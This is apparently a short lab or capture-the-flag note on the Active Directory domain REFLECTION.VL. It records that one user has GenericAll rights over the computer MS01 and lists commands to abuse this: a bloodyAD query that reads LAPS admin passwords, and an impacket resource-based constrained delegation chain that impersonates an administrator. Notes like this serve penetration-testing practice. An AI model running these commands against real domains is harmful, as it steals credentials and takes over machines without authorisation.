The user ABBIE.SMITH@REFLECTION.VL has GenericAll permissions to the computer MS01.REFLECTION.VL.

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

![[Pasted image 20260326135737.png]]


May be able to retrieve LAPS passoword:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

Can also do RBCD:

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'

rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'

getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
```


